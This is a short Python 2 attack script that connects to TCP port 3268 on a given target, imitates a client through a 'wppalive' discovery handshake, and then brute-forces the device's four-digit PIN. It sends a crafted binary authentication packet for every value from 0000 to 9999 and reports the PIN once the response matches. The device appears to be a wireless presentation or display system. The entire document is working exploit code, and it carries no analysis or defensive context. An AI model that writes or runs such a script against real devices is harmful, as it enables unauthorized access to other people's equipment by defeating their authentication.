#!/usr/bin/env python
import socket
import sys

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: %s target" % sys.argv[0])
        sys.exit(1)

    target = sys.argv[1]
    print("[+] Establishing connection to %s" % target)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target, 3268))
        # Discovery
        s.send("wppaliveROCK")
        response = s.recv(2048)
        if response != "wppaliveROLL":
            raise Exception("An error occured during discovery")

        s.send("\x77\x70\x70\x63\x6d\x64\x00\x00\x90")
        response = s.recv(2048)
        print("[+] Connection established with %s (%s)" % (target, response[25:40]))

        s.send("wppaliveROCK")
        response = s.recv(2048)
        if response != "wppaliveROLL":
            raise Exception("An error occured during association")

        print("[+] Starting PIN bruteforcing ...")

        # Authentication
        payload = "\x77\x70\x70\x63\x6d\x64\x00\x00\x92\x47\x72\x65\x6d\x77\x65\x6c" \
            "\x6c\x27\x73\x20\x69\x50\x61\x64\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\xa8\x0c\xe4%s" \
        "\x00\x00\x00\x00\x1e\x0a\x0a\x00\x01\x00\x00\x02\x4a\x6e\x4d" \
        "\x4f\x50\x53\x44\x4b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00"

        for i in range(0, 10000):
            pin = str(i).zfill(4)
            s.send(payload % pin)
            response = s.recv(2048)
            if response.encode('hex')[-4:] == "9301":
                print("\n[*] PIN code is %s" % pin)
                break
            sys.stdout.write('\r')
            sys.stdout.write('[+] PIN checked: %d/%d' % (i, 10000))
            sys.stdout.flush()

    except Exception as e:
        print("[!] %s" % e.message)
        s.close()
